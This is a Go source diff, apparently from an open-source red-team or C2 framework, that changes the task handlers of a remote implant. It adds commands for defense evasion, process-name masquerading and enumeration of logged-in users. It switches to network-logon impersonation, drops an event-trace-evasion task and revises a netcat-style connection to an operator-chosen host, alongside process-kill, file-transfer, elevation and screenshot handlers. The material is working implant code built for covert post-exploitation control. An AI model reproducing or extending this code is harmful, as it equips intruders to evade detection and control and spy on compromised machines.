@@ -29,7 +29,6 @@ import (
 	"github.com/iDigitalFlame/xmt/com"
 	"github.com/iDigitalFlame/xmt/data"
 	"github.com/iDigitalFlame/xmt/device"
-	"github.com/iDigitalFlame/xmt/device/evade"
 	"github.com/iDigitalFlame/xmt/device/screen"
 	"github.com/iDigitalFlame/xmt/man"
 	"github.com/iDigitalFlame/xmt/util/bugtrack"
@@ -56,25 +55,12 @@ const (
 )
 
 var (
-	_ Callable = (*DLL)(nil)
-	_ Callable = (*Zombie)(nil)
-	_ Callable = (*Process)(nil)
-	_ Callable = (*Assembly)(nil)
-	_ backer   = (*data.Chunk)(nil)
-	_ backer   = (*com.Packet)(nil)
+	_ backer = (*data.Chunk)(nil)
+	_ backer = (*com.Packet)(nil)
 )
 
 type backer interface {
 	WriteUint32Pos(int, uint32) error
-}
-
-// Callable is an internal interface used to specify a wide range of Runnable
-// types that can be Marshaled into a Packet.
-//
-// Currently the DLL, Zombie, Assembly and Process instances are supported.
-type Callable interface {
-	task() uint8
-	MarshalStream(data.Writer) error
 }
 
 func (DLL) task() uint8 {
@@ -142,6 +128,26 @@ func taskPull(x context.Context, r data.Reader, w data.Writer) error {
 	w.WriteInt64(n)
 	return err
 }
+func taskEvade(_ context.Context, r data.Reader, _ data.Writer) error {
+	f, err := r.Uint8()
+	if err != nil {
+		return err
+	}
+	return device.Evade(f)
+}
+func taskLogins(_ context.Context, _ data.Reader, w data.Writer) error {
+	e, err := device.Logins()
+	if err != nil {
+		return err
+	}
+	w.WriteUint16(uint16(len(e)))
+	for i := 0; i < len(e) && i < 0xFFFF; i++ {
+		if err = e[i].MarshalStream(w); err != nil {
+			return err
+		}
+	}
+	return nil
+}
 func taskNetcat(x context.Context, r data.Reader, w data.Writer) error {
 	h, err := r.StringVal()
 	if err != nil {
@@ -182,24 +188,25 @@ func taskNetcat(x context.Context, r data.Reader, w data.Writer) error {
 	}
 	k := time.Second * 5
 	if t > 0 {
-		k = time.Duration(5)
+		k = time.Duration(t)
 	}
-	c.SetWriteDeadline(time.Now().Add(k))
-	n, err := c.Write(b)
-	if err != nil {
-		f()
-		c.Close()
-		return err
-	}
-	if n != len(b) {
-		f()
-		c.Close()
-		return io.ErrShortWrite
+	if len(b) > 0 {
+		c.SetWriteDeadline(time.Now().Add(k))
+		n, err := c.Write(b)
+		if err != nil {
+			f()
+			c.Close()
+			return err
+		}
+		if n != len(b) {
+			f()
+			c.Close()
+			return io.ErrShortWrite
+		}
 	}
 	if p&128 == 0 {
 		f()
 		c.Close()
-		w.WriteUint8(0)
 		return nil
 	}
 	c.SetReadDeadline(time.Now().Add(k))
@@ -228,6 +235,13 @@ func taskUpload(x context.Context, r data.Reader, w data.Writer) error {
 	w.WriteString(v)
 	w.WriteInt64(c)
 	return err
+}
+func taskRename(_ context.Context, r data.Reader, _ data.Writer) error {
+	s, err := r.StringVal()
+	if err != nil {
+		return err
+	}
+	return device.SetProcessName(s)
 }
 func taskElevate(_ context.Context, r data.Reader, _ data.Writer) error {
 	var f filter.Filter
@@ -358,9 +372,9 @@ func taskSystemIo(x context.Context, r data.Reader, w data.Writer) error {
 		if err = r.ReadUint32(&i); err != nil {
 			return err
 		}
-		p, err1 := os.FindProcess(int(i))
-		if err1 != nil {
-			return err1
+		var p *os.Process
+		if p, err = os.FindProcess(int(i)); err != nil {
+			return err
 		}
 		err = p.Kill()
 		p.Release()
@@ -439,15 +453,15 @@ func taskSystemIo(x context.Context, r data.Reader, w data.Writer) error {
 			s.Close()
 			return err
 		}
-		v := data.NewCtxReader(x, s)
-		c, err1 := io.Copy(f, v)
+		var (
+			v = data.NewCtxReader(x, s)
+			c int64
+		)
+		c, err = io.Copy(f, v)
 		v.Close()
 		f.Close()
 		w.WriteString(u)
-		if w.WriteInt64(c); t == taskIoCopy {
-			return err1
-		}
-		if err1 != nil {
+		if w.WriteInt64(c); t == taskIoCopy || err != nil {
 			return err
 		}
 		return os.Remove(k)
@@ -471,10 +485,7 @@ func taskLoginUser(_ context.Context, r data.Reader, _ data.Writer) error {
 	if err = r.ReadString(&p); err != nil {
 		return err
 	}
-	return device.ImpersonateUser(u, d, p)
-}
-func taskZeroTrace(_ context.Context, _ data.Reader, _ data.Writer) error {
-	return evade.ZeroTraceEvent()
+	return device.ImpersonateUserNetwork(u, d, p)
 }
 func taskScreenShot(_ context.Context, _ data.Reader, w data.Writer) error {
 	return screen.Capture(w)
